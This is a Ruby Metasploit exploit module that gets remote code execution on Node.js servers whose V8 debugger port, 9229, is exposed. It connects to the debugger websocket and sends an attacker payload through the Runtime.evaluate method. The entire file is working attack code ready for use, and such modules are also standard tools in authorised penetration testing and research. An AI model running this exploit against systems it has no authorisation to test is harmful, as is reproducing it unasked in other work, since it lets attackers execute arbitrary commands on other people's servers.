class MetasploitModule < Msf::Exploit::Remote
  require 'eventmachine'
  require 'faye/websocket'
  include Msf::Exploit::Remote::HttpClient
  Rank = ExcellentRanking

  def initialize(info={})
    super(update_info(info,
      'Name'           => "NodeJS Debugger Code Execution",
      'Description'    => %q{
        This module uses the "Runtime.evaluate" request of the NodeJS 6.3+ V8
        debugger to evaluate arbitrary JS and call out to other system commands. 
        The port (default 9229) is not exposed non-locally in default configurations, 
        but may be exposed either intentionally or via misconfiguration.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 
        'Adam Baldwin (EvilPacket)',
        'Nicholas Starke (The King Pig Demon)' 
      ],
      'References'     =>
        [
          [ 'URL', 'https://nodejs.org/en/docs/guides/debugging-getting-started/' ],
          [ 'URL', 'https://chromedevtools.github.io/devtools-protocol/v8/Runtime#method-evaluate' ]
        ],
      'Targets'        =>
        [
          ['NodeJS', { 'Platform' => 'nodejs', 'Arch' => 'nodejs' } ],
        ],
      'Privileged'     => false,
      'DefaultTarget'  => 0)
    )

    register_options(
      [
        Opt::RHOST,
        Opt::RPORT(9229),
      ])

    deregister_options('Proxies')
    deregister_options('VHOST')
    deregister_options('SSL')
  end

  def exploit
    res = send_request_cgi({
        'uri' => '/json',
        'method' => 'GET',
    })

    if res.nil?
      print_error('Bad Response')
    else
      data = JSON.parse(res.body).pop
      EM.run {
        print_status("Attempting Connection to #{data['webSocketDebuggerUrl']}")

        if not data.key?('webSocketDebuggerUrl')
          fail_with(Failure::Unknown, "Invalid JSON")
        end

        driver = Faye::WebSocket::Client.new(data['webSocketDebuggerUrl'])

        driver.on :open do |event|
          print_status('Opened connection')
          id = rand(1024 * 1024 * 1024)

          @succeeded = false

          EM::Timer.new(5) do
            print_status("Sending payload...")
            driver.send({
              'id' => id,
              'method' => 'Runtime.evaluate',
              'params' => {
                'expression':  payload.encoded,
              }
            }.to_json)
            @succeeded = true
          end
        end

        driver.on :message do |event|
          print_status("Received Data")

          data = JSON.parse(event.data)
          @succeeded = true
          EventMachine.stop
        end
      }
    end  
  end

end
